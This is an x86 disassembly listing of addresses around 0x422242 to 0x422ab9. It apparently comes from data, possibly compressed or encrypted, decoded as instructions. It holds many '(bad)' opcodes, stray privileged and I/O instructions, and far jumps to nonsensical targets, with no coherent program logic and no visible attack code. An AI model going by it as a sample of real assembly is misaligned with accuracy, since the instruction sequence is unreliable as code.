  422242:	inc    edx
  422243:	ret    0xf2
	...
  422252:	fidiv  DWORD PTR [edx]
  422254:	xchg   edi,eax
  422255:	mov    bh,bh
  422257:	scas   eax,DWORD PTR es:[edi]
  422258:	fbstp  TBYTE PTR [edx+0x3]
  42225b:	inc    ebp
  42225c:	mov    ds:0x54d2ef5c,eax
  422261:	add    eax,0x1d821
  422266:	pop    ebx
  422267:	add    BYTE PTR [eax],al
  422269:	add    BYTE PTR [ebx+0x8444491],ah
  42226f:	iret   
  422270:	xor    ah,BYTE PTR [ebx]
  422272:	fcmovu st,st(5)
  422274:	mov    ds:0xe28dd1a9,eax
  422279:	mov    ds:0x61d56cd3,al
  42227e:	cmp    eax,eax
  422280:	sbb    ecx,DWORD PTR [edx-0x2f382e05]
  422286:	sbb    BYTE PTR [edi],bh
  422288:	jne    0x4222c1
  42228a:	and    BYTE PTR [esi+0x2a],cl
  42228d:	fcomp  st(6)
  42228f:	push   cs
  422290:	fiadd  WORD PTR [esi]
  422292:	fld    TBYTE PTR [ecx]
  422294:	pop    ecx
  422295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422296:	xchg   edi,eax
  422297:	push   ds
  422298:	dec    eax
  422299:	mov    ecx,DWORD PTR [edx+ecx*8-0x7]
  42229d:	aad    0x46
  42229f:	test   bh,0xf9
  4222a2:	mov    BYTE PTR [ecx+0x67],0x98
  4222a6:	sub    eax,0x605afe88
  4222ab:	xchg   esi,eax
  4222ac:	scas   al,BYTE PTR es:[edi]
  4222ad:	ret    
  4222ae:	call   0x81e73ebc
  4222b3:	hlt    
  4222b4:	sub    BYTE PTR [ebp+eiz*8-0x5845ff9f],ch
  4222bb:	and    BYTE PTR [esp+eax*1+0x7607c440],dh
  4222c2:	adc    ecx,DWORD PTR [edx]
  4222c4:	jne    0x4222c6
	...
  4222d2:	dec    eax
  4222d3:	in     al,0x3
  4222d5:	fwait
  4222d6:	scas   eax,DWORD PTR es:[edi]
  4222d7:	(bad)  
  4222d8:	fdiv   st,st(7)
  4222da:	pop    esi
  4222db:	sub    BYTE PTR [eax+0x16ac6f8f],bl
  4222e1:	sar    DWORD PTR [eax+ebx*8+0x1],0x0
  4222e6:	pop    ebx
  4222e7:	add    BYTE PTR [eax],al
  4222e9:	add    BYTE PTR [ebp+eiz*2-0x75dd04b0],al
  4222f0:	test   al,0xb6
  4222f2:	outs   dx,DWORD PTR ds:[esi]
  4222f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222f4:	scas   al,BYTE PTR es:[edi]
  4222f5:	inc    ebx
  4222f6:	call   0x621:0x4ae9da52
  4222fd:	out    0x4b,eax
  4222ff:	and    DWORD PTR [ebx+0x69],esp
  422302:	jo     0x422383
  422304:	jno    0x422364
  422306:	inc    esp
  422307:	retf   0x7bde
  42230a:	and    DWORD PTR ds:0xf4597588,0x54f13b34
  422314:	adc    esi,ebp
  422316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422317:	and    bl,BYTE PTR [edx]
  422319:	push   esp
  42231a:	xor    DWORD PTR [eax],edi
  42231c:	outs   dx,DWORD PTR ds:[esi]
  42231d:	or     ah,BYTE PTR [edi-0x6a22f097]
  422323:	push   cs
  422324:	adc    DWORD PTR [esi-0x6c857b3a],0xffffff81
  42232b:	sbb    DWORD PTR [ecx+0xdfb48c5],edi
  422331:	lds    edx,FWORD PTR [ebx]
  422333:	sbb    cl,BYTE PTR [ebp-0x349412c5]
  422339:	(bad)  
  42233a:	mov    ecx,0x6ca43245
  42233f:	sti    
  422340:	sbb    eax,0x22d7fbde
	...
  422351:	add    BYTE PTR [edx+0x4],dl
  422354:	mov    ds:0x72a6f682,al
  422359:	aam    0x6d
  42235b:	xor    dh,BYTE PTR [edx]
  42235d:	and    eax,0x87b898e6
  422362:	xlat   BYTE PTR ds:[ebx]
  422363:	fadd   DWORD PTR [ecx]
  422365:	add    BYTE PTR [ebx+0x0],bl
  422368:	add    BYTE PTR [eax],al
  42236a:	in     al,0x5
  42236c:	sbb    al,0xa6
  42236e:	mov    BYTE PTR [eax+edi*4-0x34a19f5],bl
  422375:	pop    eax
  422376:	ss gs jo 0x42237c
  42237a:	rcr    DWORD PTR ds:0x6bf93b81,cl
  422380:	jns    0x422318
  422382:	mov    bh,0xc4
  422384:	fnsave [eax]
  422386:	or     dl,ch
  422388:	aas    
  422389:	dec    ebp
  42238a:	push   eax
  42238b:	hlt    
  42238c:	pop    edx
  42238d:	push   edi
  42238e:	pop    ebx
  42238f:	stc    
  422390:	or     eax,0x605a4237
  422395:	cdq    
  422396:	fbstp  TBYTE PTR [ebp+0x38794d2b]
  42239c:	int3   
  42239d:	in     al,dx
  42239e:	inc    ebx
  42239f:	jmp    0x3e38:0x34dc9c3b
  4223a6:	in     eax,dx
  4223a7:	cwde   
  4223a8:	aaa    
  4223a9:	lods   al,BYTE PTR ds:[esi]
  4223aa:	or     ebx,DWORD PTR [esi]
  4223ac:	jns    0x42239e
  4223ae:	add    ecx,DWORD PTR [edi+0x33]
  4223b1:	mov    ecx,0x24fe7b33
  4223b6:	xchg   ecx,eax
  4223b7:	sub    esp,DWORD PTR [ebp-0xd]
  4223ba:	fs lahf 
  4223bc:	mov    esp,0x24349da3
  4223c1:	pop    edi
  4223c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223c3:	sub    cl,BYTE PTR [edx+0x0]
	...
  4223d2:	cmp    BYTE PTR [edx-0x6a],ch
  4223d5:	add    edx,esi
  4223d7:	(bad)  
  4223d8:	mov    ebp,0xdb4ef67b
  4223dd:	out    0x9,eax
  4223df:	jecxz  0x4223ba
  4223e1:	data16 xor bl,cl
  4223e4:	add    DWORD PTR [eax],eax
  4223e6:	pop    ebx
  4223e7:	add    BYTE PTR [eax],al
  4223e9:	add    BYTE PTR [esi+ebx*1],al
  4223ec:	push   ebx
  4223ed:	rcl    DWORD PTR [edi-0x15],0x5c
  4223f1:	xchg   ecx,eax
  4223f2:	push   0xffffffc2
  4223f4:	(bad)  
  4223f5:	dec    esp
  4223f6:	xchg   ecx,eax
  4223f7:	push   0xffffffb1
  4223f9:	or     eax,0x85b42684
  4223fe:	or     DWORD PTR [esi+edx*2],edi
  422401:	sbb    eax,0x4b7aef19
  422406:	inc    esp
  422407:	outs   dx,BYTE PTR ds:[esi]
  422408:	sub    bl,dl
  42240a:	stc    
  42240b:	xor    edi,eax
  42240d:	in     al,dx
  42240e:	xor    al,BYTE PTR [eax+0x46]
  422411:	test   DWORD PTR [ecx-0x9],esi
  422414:	in     al,0x37
  422416:	jae    0x422438
  422418:	pushf  
  422419:	js     0x4223fd
  42241b:	mov    ah,0x69
  42241d:	sar    DWORD PTR [ecx-0x7b],1
  422420:	adc    BYTE PTR [eax+0x7ceb7502],cl
  422426:	mov    esi,0x8b459525
  42242b:	adc    DWORD PTR [ecx],ebp
  42242d:	call   0xb53206b3
  422432:	mov    edi,0x1643996e
  422437:	lock and dh,BYTE PTR ss:[edi]
  42243b:	scas   al,BYTE PTR es:[edi]
  42243c:	mov    al,0x4d
  42243e:	imul   BYTE PTR [edi-0x8e2a549]
  422444:	fadd   DWORD PTR [eax]
	...
  422452:	jmp    0x7a729f10
  422457:	repz jmp 0x422453
  42245a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42245e:	inc    eax
  42245f:	arpl   WORD PTR [ecx],cx
  422461:	inc    ebx
  422462:	(bad)  
  422463:	fld    DWORD PTR [ecx]
  422465:	add    BYTE PTR [ebx+0x0],bl
  422468:	add    BYTE PTR [eax],al
  42246a:	loopne 0x422428
  42246c:	ret    0xb3d4
  42246f:	xchg   ebp,eax
  422470:	mov    eax,ds:0x51a1163f
  422475:	pop    esp
  422476:	mov    BYTE PTR [ebx+0x38858fd2],cl
  42247c:	cdq    
  42247d:	jb     0x4224af
  42247f:	fiadd  WORD PTR [ecx]
  422481:	jns    0x422484
  422483:	imul   ebx,DWORD PTR [edi+0x1a]
  422487:	std    
  422488:	mov    ch,0x57
  42248a:	xchg   esp,eax
  42248b:	dec    edx
  42248c:	outs   dx,DWORD PTR ds:[esi]
  42248d:	arpl   WORD PTR [edx-0x3f],bx
  422490:	imul   esp,DWORD PTR [ebx],0xffffffdf
  422493:	repnz sbb bh,BYTE PTR [edx+eiz*4+0x6b]
  422498:	pop    esp
  422499:	call   0xbbf3ed92
  42249e:	inc    esi
  42249f:	int3   
  4224a0:	jb     0x42242b
  4224a2:	add    DWORD PTR [edi-0x18b9197],0xce940e04
  4224ac:	and    ebp,0x48
  4224af:	ds arpl dx,sp
  4224b2:	and    eax,0x90bd32b0
  4224b7:	int3   
  4224b8:	test   BYTE PTR [eax-0x58],al
  4224bb:	mov    esp,0x7752c33a
  4224c0:	out    0x5e,al
  4224c2:	sbb    DWORD PTR [edi],0x63
	...
  4224d1:	add    BYTE PTR [ebx+0x41],bl
  4224d4:	pop    ebx
  4224d5:	iret   
  4224d6:	pop    ebx
  4224d7:	(bad)  
  4224d9:	aad    0xf
  4224db:	ss dec esp
  4224dd:	dec    esi
  4224de:	test   BYTE PTR [edx-0x2617f38f],dh
  4224e4:	add    DWORD PTR [eax],eax
  4224e6:	pop    ebx
  4224e7:	add    BYTE PTR [eax],al
  4224e9:	add    BYTE PTR [edx+0x12],cl
  4224ec:	aas    
  4224ed:	inc    ebx
  4224ee:	inc    edi
  4224ef:	add    ebx,edi
  4224f1:	sub    esi,DWORD PTR [esi]
  4224f3:	mov    bl,0x64
  4224f5:	push   cs
  4224f6:	fld    TBYTE PTR [ebx+0x3f]
  4224f9:	(bad)  
  4224fa:	fld    TBYTE PTR [ebx+edx*1]
  4224fd:	jge    0x422550
  4224ff:	sbb    edx,DWORD PTR [esi-0x51]
  422502:	ds inc ebx
  422504:	mov    ch,0x28
  422506:	inc    esi
  422507:	leave  
  422508:	push   ds
  422509:	aad    0x1b
  42250b:	adc    ah,BYTE PTR [edx+0x548c6588]
  422511:	and    eax,ecx
  422513:	pop    ecx
  422514:	mov    bl,0xa1
  422516:	xlat   BYTE PTR ds:[ebx]
  422517:	inc    edi
  422518:	add    BYTE PTR [ebp+eiz*2+0x7],cl
  42251c:	jecxz  0x422541
  42251e:	push   eax
  42251f:	stos   BYTE PTR es:[edi],al
  422520:	push   eax
  422521:	cmp    ch,BYTE PTR [edi-0x13d1fe29]
  422527:	out    dx,eax
  422528:	mov    dl,0x7d
  42252a:	stos   DWORD PTR es:[edi],eax
  42252b:	mov    ebx,esi
  42252d:	or     eax,0xff184238
  422532:	jmp    0xafe:0x5850b3f3
  422539:	popf   
  42253a:	arpl   bp,bx
  42253c:	inc    esp
  42253d:	adc    bl,cl
  42253f:	push   ds
  422540:	push   esi
  422541:	sahf   
  422542:	in     al,dx
  422543:	fmul   st(2),st
	...
  422551:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422557:	cld    
  422558:	(bad)  [edi-0x65be08a1]
  42255e:	sahf   
  42255f:	and    ch,BYTE PTR [ebx]
  422561:	inc    esi
  422562:	inc    ebx
  422563:	fiadd  DWORD PTR [ecx]
  422565:	add    BYTE PTR [ebx+0x0],bl
  422568:	add    BYTE PTR [eax],al
  42256a:	stc    
  42256b:	call   0x91fd:0x1b180d3e
  422572:	jno    0x4225bf
  422574:	jge    0x422576
  422576:	jecxz  0x422550
  422578:	ss inc edx
  42257a:	adc    ecx,DWORD PTR [bx+si+0x49]
  42257e:	lods   al,BYTE PTR ds:[esi]
  42257f:	inc    esi
  422580:	cwde   
  422581:	inc    ebp
  422582:	aam    0xc9
  422584:	outs   dx,DWORD PTR ds:[esi]
  422585:	cdq    
  422586:	aas    
  422587:	mov    ds:0x56abc87f,al
  42258c:	lods   al,BYTE PTR ds:[esi]
  42258e:	add    ebp,DWORD PTR [edx-0x27eeaf0f]
  422594:	mov    ebp,0xaf3144c6
  422599:	ins    BYTE PTR es:[edi],dx
  42259a:	mov    esp,0xdd54db73
  42259f:	jae    0x42257f
  4225a1:	pop    edx
  4225a2:	add    eax,0x61810b4d
  4225a7:	cmp    DWORD PTR [ebp-0x7f],edx
  4225aa:	dec    edi
  4225ab:	inc    edi
  4225ac:	inc    ebp
  4225ad:	scas   eax,DWORD PTR es:[edi]
  4225ae:	push   0xffffffd2
  4225b0:	arpl   WORD PTR [esi+eax*1+0x19b981c6],dx
  4225b7:	fidivr WORD PTR ds:0xa85f14f4
  4225bd:	add    BYTE PTR [eax],bl
  4225bf:	dec    ebp
  4225c0:	sahf   
  4225c1:	scas   al,BYTE PTR es:[edi]
  4225c2:	pushf  
  4225c3:	xor    ah,BYTE PTR [ebx]
	...
  4225d1:	add    BYTE PTR [esi+0x73],ch
  4225d4:	lock retf 0xcbfd
  4225d8:	jle    0x4225d1
  4225da:	repz xor eax,0xb248ce9
  4225e0:	stc    
  4225e1:	mov    edi,0x1da9e
  4225e6:	pop    ebx
  4225e7:	add    BYTE PTR [eax],al
  4225e9:	add    BYTE PTR [ebx],dl
  4225eb:	out    0x65,al
  4225ed:	mov    DWORD PTR [ebp-0x4711075c],ecx
  4225f3:	mov    edi,0xc5b107de
  4225f8:	je     0x4225c2
  4225fa:	or     al,0x1f
  4225fc:	mov    DWORD PTR [edi+0x64],esp
  4225ff:	(bad)  
  422600:	sub    al,0x9c
  422602:	inc    esp
  422603:	lods   eax,DWORD PTR ds:[esi]
  422604:	inc    ebp
  422605:	pop    ss
  422606:	popf   
  422607:	jbe    0x42263a
  422609:	not    DWORD PTR [edx+0x7ab0d8e2]
  42260f:	scas   eax,DWORD PTR es:[edi]
  422610:	push   cs
  422611:	nop
  422612:	push   es
  422613:	and    DWORD PTR [ecx+0x2cad9b93],0xffffffe1
  42261a:	mov    bh,0xb8
  42261c:	cmp    DWORD PTR [esi+esi*8+0x9],0x6ac191a9
  422624:	xchg   esi,eax
  422625:	add    ah,BYTE PTR [si-0x78c]
  42262a:	xchg   ebx,eax
  42262b:	aaa    
  42262c:	call   FWORD PTR [eax+0x35]
  42262f:	std    
  422630:	adc    eax,0xb002873c
  422635:	jg     0x4225ca
  422637:	dec    esp
  422638:	addr16 hlt 
  42263a:	fdiv   DWORD PTR [ecx]
  42263c:	cmp    dh,BYTE PTR [eax+0x59891cfa]
  422642:	xor    eax,0x2026
	...
  42264f:	add    BYTE PTR [eax],al
  422651:	add    ch,dh
  422653:	adc    al,0xae
  422655:	adc    ebp,edi
  422657:	mov    ebx,0x84e6f6fd
  42265c:	lds    ebp,FWORD PTR [edx-0x41928122]
  422662:	stc    
  422663:	fiadd  DWORD PTR [ecx]
  422665:	add    BYTE PTR [ebx+0x0],bl
  422668:	add    BYTE PTR [eax],al
  42266a:	imul   ebp,DWORD PTR [esi],0x42
  42266d:	jl     0x422686
  42266f:	jo     0x422641
  422671:	xor    eax,0x710f9ac
  422676:	and    al,0x2c
  422678:	ds aad 0x3e
  42267b:	xor    BYTE PTR [edi+0x43da3714],0xc
  422682:	fprem1 
  422684:	fsub   DWORD PTR [eax+0x5f]
  422687:	pop    ebx
  422688:	clc    
  422689:	aas    
  42268a:	test   eax,0x738cbb54
  42268f:	enter  0xc7e1,0x23
  422693:	icebp  
  422694:	(bad)  
  422695:	push   eax
  422696:	popa   
  422697:	pushf  
  422698:	add    esp,esp
  42269a:	xchg   esp,eax
  42269b:	mov    fs,WORD PTR [ebx]
  42269d:	les    ebp,FWORD PTR [eax+eax*8-0x15a16d2b]
  4226a4:	or     eax,0xcb638ba
  4226a9:	push   edi
  4226aa:	xor    esi,esp
  4226ac:	cmp    al,0x42
  4226ae:	and    al,0xe6
  4226b0:	sbb    esp,DWORD PTR [ecx-0x6675a7be]
  4226b6:	cs (bad) 
  4226b8:	bound  eax,QWORD PTR [ecx+0x2d0a8bf0]
  4226be:	xlat   BYTE PTR ds:[ebx]
  4226bf:	call   0xe0:0xa97ec654
	...
  4226d2:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4226d8:	mov    edi,0xbb1c16fb
  4226dd:	shr    dh,0xc9
  4226e0:	ret    0x54c0
  4226e3:	fild   DWORD PTR [ecx]
  4226e5:	add    BYTE PTR [ebx+0x0],bl
  4226e8:	add    BYTE PTR [eax],al
  4226ea:	ret    
  4226eb:	loop   0x42276a
  4226ed:	clc    
  4226ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ef:	sbb    BYTE PTR fs:[ecx+edi*8],dl
  4226f3:	(bad)  
  4226f5:	inc    esi
  4226f6:	les    esi,FWORD PTR [edx+0x3f83d6cd]
  4226fc:	xor    esi,DWORD PTR [ebx-0x67]
  4226ff:	retf   
  422700:	fimul  DWORD PTR [ecx-0x20]
  422704:	icebp  
  422705:	pop    ebx
  422706:	xor    al,0x4a
  422708:	test   DWORD PTR [esp],0x33d9a182
  42270f:	inc    edi
  422710:	dec    esi
  422711:	mov    ch,0xfd
  422713:	ror    BYTE PTR [edi-0x1f],cl
  422716:	push   0x70fe9e79
  42271b:	data16 xor BYTE PTR [esi+0x43b55e1a],0x99
  422723:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  422725:	fs lock mov edi,es
  422729:	xor    bl,dl
  42272b:	cli    
  42272c:	mov    edx,0xb747e8cb
  422731:	pusha  
  422732:	and    eax,0xe7dc61a5
  422737:	mov    dl,0x1e
  422739:	out    0x9,eax
  42273b:	daa    
  42273c:	mov    ebx,ebx
  42273e:	sbb    al,0x8c
  422740:	pushf  
  422741:	xchg   ebx,eax
  422743:	cdq    
  422744:	stos   DWORD PTR es:[edi],eax
	...
  422751:	add    ah,dl
  422753:	sqrtps xmm6,xmm0
  422756:	(bad)  
  422758:	cmc    
  422759:	das    
  42275a:	sbb    BYTE PTR [eax],cl
  42275c:	xchg   ebx,eax
  42275d:	iret   
  42275e:	dec    ebp
  42275f:	mov    ds:0xdbaf4fa7,eax
  422764:	add    DWORD PTR [eax],eax
  422766:	pop    ebx
  422767:	add    BYTE PTR [eax],al
  422769:	add    BYTE PTR [eax],cl
  42276b:	rcr    BYTE PTR [ebx-0x1b],1
  42276e:	push   ebx
  42276f:	push   edi
  422770:	adc    esp,DWORD PTR ds:0x93095374
  422776:	dec    ebp
  422777:	pmaddwd mm6,QWORD PTR [ecx-0x6454ea29]
  42277e:	inc    ebx
  42277f:	jbe    0x4227e7
  422781:	add    eax,0xe95e8782
  422786:	add    ebx,ebp
  422788:	push   ds
  422789:	pusha  
  42278a:	jle    0x42278c
  42278c:	push   edi
  42278d:	xchg   ebp,eax
  42278e:	add    dl,BYTE PTR [edx-0x80]
  422791:	aaa    
  422792:	push   ebp
  422794:	push   esi
  422795:	and    DWORD PTR [esi-0x4dc35477],esi
  42279b:	es pop es
  42279d:	pop    esp
  42279e:	aam    0x48
  4227a0:	cmp    BYTE PTR [esi],0xc4
  4227a3:	dec    ebp
  4227a4:	dec    edi
  4227a5:	loope  0x42276d
  4227a7:	int    0x20
  4227a9:	cmc    
  4227aa:	adc    DWORD PTR [ebp-0x76ce6820],ebp
  4227b0:	jle    0x422823
  4227b2:	dec    ebp
  4227b3:	xor    eax,0x50b25cca
  4227b8:	sbb    dh,BYTE PTR [ecx-0x25b6d6d1]
  4227be:	test   DWORD PTR [edx],0x422e7f55
  4227c4:	pop    edi
	...
  4227d1:	add    ch,cl
  4227d3:	sub    eax,0xfbf54395
  4227d8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227de:	clc    
  4227df:	stc    
  4227e0:	mov    ?,WORD PTR [edx+0xa]
  4227e3:	fadd   QWORD PTR [ecx]
  4227e5:	add    BYTE PTR [ebx+0x0],bl
  4227e8:	add    BYTE PTR [eax],al
  4227ea:	xchg   ebp,eax
  4227eb:	addr16 mov ds:0x970,al
  4227ef:	and    bh,BYTE PTR [eax+0x1a]
  4227f2:	jp     0x4227be
  4227f4:	or     al,0xd9
  4227f6:	push   eax
  4227f7:	dec    esi
  4227f8:	and    edx,DWORD PTR [esi-0x40]
  4227fb:	imul   esp,DWORD PTR [ebx],0xa1e7d731
  422801:	jae    0x4227de
  422803:	jg     0x42280e
  422805:	test   eax,0xe1c6e012
  42280a:	js     0x422802
  42280c:	les    ebp,FWORD PTR [ecx+ebx*1-0x6b]
  422810:	xor    BYTE PTR [esi+edi*1+0x59],dh
  422814:	dec    ebx
  422815:	ds dec edi
  422817:	jmp    0x263:0xc7d3cc1
  42281e:	jmp    0x42282d
  422820:	inc    ebp
  422821:	push   eax
  422822:	inc    DWORD PTR [ecx-0x1]
  422825:	fs xchg edi,eax
  422827:	xor    DWORD PTR [eax+0x45],ebp
  42282a:	sub    DWORD PTR [ecx+0x45],edx
  42282d:	sub    eax,0xaf575e41
  422832:	inc    esp
  422833:	jl     0x422839
  422835:	sbb    DWORD PTR [ecx+0x4284b5e],0xffffffbd
  42283c:	rol    DWORD PTR [ecx-0x35],0x91
  422840:	jno    0x4227c5
  422842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422843:	(bad)  [ecx+0x0]
	...
  422852:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422856:	test   DWORD PTR [ebx-0xce58301],0x5d8f4cfc
  422860:	xchg   edx,eax
  422861:	dec    ecx
  422862:	fadd   QWORD PTR gs:[ecx]
  422865:	add    BYTE PTR [ebx+0x0],bl
  422868:	add    BYTE PTR [eax],al
  42286a:	mov    bh,0x69
  42286c:	add    ecx,edx
  42286e:	sub    eax,DWORD PTR [ecx+0x48d71dc]
  422874:	outs   dx,DWORD PTR ds:[esi]
  422875:	push   es
  422876:	push   esp
  422877:	(bad)  
  422878:	lods   eax,DWORD PTR ds:[esi]
  422879:	mov    ds:0xe874fd5a,eax
  42287e:	ja     0x422800
  422880:	push   ebp
  422881:	mov    DWORD PTR [edi+0x1047f042],ebx
  422887:	arpl   WORD PTR [esi],ax
  422889:	dec    edi
  42288a:	adc    eax,0x99097bd7
  42288f:	pusha  
  422890:	cdq    
  422891:	mov    esp,0xd1b3cc
  422896:	fcom   DWORD PTR [ebx]
  422898:	ja     0x42285b
  42289a:	add    DWORD PTR [esi+0x67],eax
  42289d:	in     al,dx
  42289e:	repz sub eax,0x823583ac
  4228a4:	mov    ah,0x9
  4228a6:	cdq    
  4228a7:	pop    eax
  4228a8:	ffreep st(6)
  4228aa:	sar    DWORD PTR [edi+edi*4],cl
  4228ad:	in     al,dx
  4228ae:	clc    
  4228af:	je     0x42291d
  4228b1:	rcr    DWORD PTR [edi+0x41a4882b],cl
  4228b7:	inc    ebx
  4228b8:	pop    edi
  4228b9:	gs jbe 0x42286a
  4228bc:	into   
  4228bd:	adc    ah,dl
  4228bf:	and    dh,bh
  4228c1:	sar    BYTE PTR [ecx+0x39b1],0x0
	...
  4228d0:	add    BYTE PTR [eax],al
  4228d2:	add    dl,BYTE PTR ss:[ebp+0xc]
  4228d6:	jne    0x422937
  4228d8:	jg     0x422914
  4228da:	clc    
  4228db:	cs aas 
  4228dd:	push   0xfe7b704e
  4228e2:	hlt    
  4228e3:	iret   
  4228e4:	add    DWORD PTR [eax],eax
  4228e6:	pop    ebx
  4228e7:	add    BYTE PTR [eax],al
  4228e9:	add    ah,al
  4228eb:	or     BYTE PTR [ecx+0x2d],ch
  4228ee:	jno    0x422918
  4228f0:	cdq    
  4228f1:	(bad)  
  4228f2:	sub    ebp,DWORD PTR [ebp-0x151c77f8]
  4228f8:	push   ecx
  4228f9:	xor    DWORD PTR [edi-0x42],ebx
  4228fc:	aad    0xda
  4228fe:	push   cs
  4228ff:	(bad)  [edi]
  422901:	fist   DWORD PTR [edi]
  422903:	sbb    BYTE PTR [edx+0x4c648192],al
  422909:	cdq    
  42290a:	aas    
  42290b:	dec    esp
  42290c:	xchg   ebx,eax
  42290d:	test   DWORD PTR [ebp-0x5da228cc],esi
  422913:	dec    BYTE PTR [ecx+0x23]
  422916:	sub    al,0x3d
  422918:	aaa    
  422919:	fsubr  DWORD PTR [ebx]
  42291b:	add    DWORD PTR fs:[edi+0x41a4d367],ebx
  422922:	add    eax,DWORD PTR [edx+eiz*1-0x24cbaadd]
  422929:	imul   esp,DWORD PTR [ebx],0x75
  42292c:	xchg   cl,dh
  42292e:	mov    bl,BYTE PTR [ecx]
  422930:	add    eax,edi
  422932:	je     0x4228be
  422934:	push   ebp
  422935:	mov    eax,0xec4b358e
  42293a:	push   edx
  42293b:	xchg   edx,eax
  42293c:	add    eax,0x63b77f6f
  422941:	lods   al,BYTE PTR ds:[esi]
  422942:	aad    0x0
  422944:	or     eax,0x0
	...
  422951:	add    BYTE PTR [eax],cl
  422953:	mov    cl,0x72
  422955:	cmp    edi,ebx
  422957:	sti    
  422958:	dec    ecx
  422959:	mov    bl,0x94
  42295b:	je     0x422934
  42295d:	call   0xd04f:0x801003e2
  422964:	add    DWORD PTR [eax],eax
  422966:	pop    ebx
  422967:	add    BYTE PTR [eax],al
  422969:	add    ah,dh
  42296b:	add    esi,DWORD PTR [edi+esi*8-0x44e69b04]
  422972:	xor    eax,0xc4605716
  422977:	retf   
  422978:	sbb    BYTE PTR [ebx+edi*1-0x73],cl
  42297c:	mov    dl,0x20
  42297e:	outs   dx,BYTE PTR ds:[esi]
  42297f:	adc    edx,0xffffffcc
  422982:	fprem  
  422984:	sub    DWORD PTR [edx],0x3
  422987:	jmp    0xf851:0xf96aaa89
  42298e:	pusha  
  42298f:	mov    al,0xde
  422991:	pop    esi
  422992:	pop    ebp
  422993:	rcr    DWORD PTR [edi],1
  422995:	cld    
  422996:	and    eax,0x83d6f401
  42299b:	outs   dx,BYTE PTR ds:[esi]
  42299c:	and    ah,BYTE PTR [edi]
  42299e:	jo     0x4229b6
  4229a0:	mov    ebp,?
  4229a2:	sbb    al,0xa1
  4229a4:	stos   DWORD PTR es:[edi],eax
  4229a5:	jl     0x422948
  4229a7:	test   BYTE PTR [esi+0xe],al
  4229aa:	mov    ah,ch
  4229ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229ad:	jne    0x422970
  4229af:	iret   
  4229b0:	mov    eax,0x1e8c2b2e
  4229b5:	jbe    0x42293c
  4229b7:	mov    cl,0x57
  4229b9:	cmp    DWORD PTR [ecx-0x40],ebp
  4229bc:	pop    eax
  4229bd:	mov    ds:0xa70de0d4,eax
  4229c2:	fidivr WORD PTR [esi+0xd6]
	...
  4229d0:	add    BYTE PTR [eax],al
  4229d2:	fist   WORD PTR [ebx-0x4e]
  4229d5:	dec    edi
  4229d6:	mov    esi,0x67d3ffef
  4229db:	xchg   ecx,edi
  4229dd:	adc    al,0x99
  4229df:	mov    eax,0xd0aa1f30
  4229e4:	add    DWORD PTR [eax],eax
  4229e6:	pop    ebx
  4229e7:	add    BYTE PTR [eax],al
  4229e9:	add    BYTE PTR [esi+ebx*4],al
  4229ec:	xchg   esi,eax
  4229ed:	or     DWORD PTR [esp+edx*4+0x734c3a82],0x3bd31adc
  4229f8:	mov    WORD PTR [eax-0x20],cs
  4229fb:	inc    ebx
  4229fc:	fmul   DWORD PTR [ecx]
  4229fe:	jbe    0x4229f0
  422a00:	scas   al,BYTE PTR es:[edi]
  422a01:	push   esp
  422a02:	popf   
  422a03:	jle    0x4229f3
  422a05:	cmp    BYTE PTR [edx+0x32],al
  422a08:	out    dx,al
  422a09:	fisubr DWORD PTR [ecx+0x152827da]
  422a0f:	or     dh,BYTE PTR [edx+0x3f]
  422a12:	fcmovnb st,st(4)
  422a14:	push   0xfffffffa
  422a16:	push   ds
  422a17:	jo     0x4229c2
  422a19:	mov    ch,0xed
  422a1b:	and    BYTE PTR [ecx+0x39],bl
  422a1e:	adc    BYTE PTR [esi+ecx*8+0x9],cl
  422a22:	repz fs je 0x4229e5
  422a26:	add    ah,BYTE PTR [edx+0x3ea27e54]
  422a2c:	daa    
  422a2d:	in     al,0x72
  422a2f:	out    dx,al
  422a30:	jnp    0x422a07
  422a32:	nop
  422a33:	sbb    DWORD PTR ds:0x76d68476,eax
  422a39:	in     al,dx
  422a3a:	inc    edx
  422a3b:	mov    dh,0x1f
  422a3d:	rol    ecx,1
  422a3f:	test   DWORD PTR [ebx],ecx
  422a41:	test   eax,0x249597
	...
  422a52:	xchg   DWORD PTR [ebx+edx*8],ecx
  422a55:	fcmovu st,st(3)
  422a57:	fisttp WORD PTR [edi+0x640ccb5d]
  422a5d:	push   ss
  422a5e:	mov    edx,0x5211ca3
  422a63:	rol    DWORD PTR [ecx],1
  422a65:	add    BYTE PTR [ebx+0x0],bl
  422a68:	add    BYTE PTR [eax],al
  422a6a:	sbb    esp,DWORD PTR [esi]
  422a6c:	scas   eax,DWORD PTR es:[edi]
  422a6d:	pop    ds
  422a6e:	pop    ebx
  422a6f:	sbb    BYTE PTR [eax],0xbb
  422a72:	pop    eax
  422a73:	mov    al,0x5c
  422a75:	add    esp,0x40
  422a78:	xchg   ecx,eax
  422a79:	les    edi,FWORD PTR [esi-0x5f]
  422a7c:	push   ss
  422a7d:	sub    eax,0x5e131eab
  422a82:	pop    edi
  422a83:	adc    eax,0xd6a8c900
  422a88:	dec    esp
  422a89:	cmc    
  422a8a:	sbb    esp,ecx
  422a8c:	retf   0x9b76
  422a8f:	jle    0x422a14
  422a91:	lds    esp,FWORD PTR [eax+0x58aa2533]
  422a97:	mov    ch,0x13
  422a99:	aad    0x62
  422a9b:	cmp    al,0xd1
  422a9d:	add    al,0xc6
  422a9f:	sbb    al,0x4c
  422aa1:	(bad)  
  422aa2:	mov    eax,0xef141ab4
  422aa7:	mov    es:0x8c359547,al
  422aad:	loope  0x422b0c
  422aaf:	dec    ecx
  422ab0:	mov    ch,0x94
  422ab2:	(bad)  
  422ab3:	outs   dx,BYTE PTR ds:[esi]
  422ab4:	call   FWORD PTR [edx+0x66]
  422ab7:	dec    eax
  422ab8:	out    dx,eax
  422ab9:	ja     0x422add
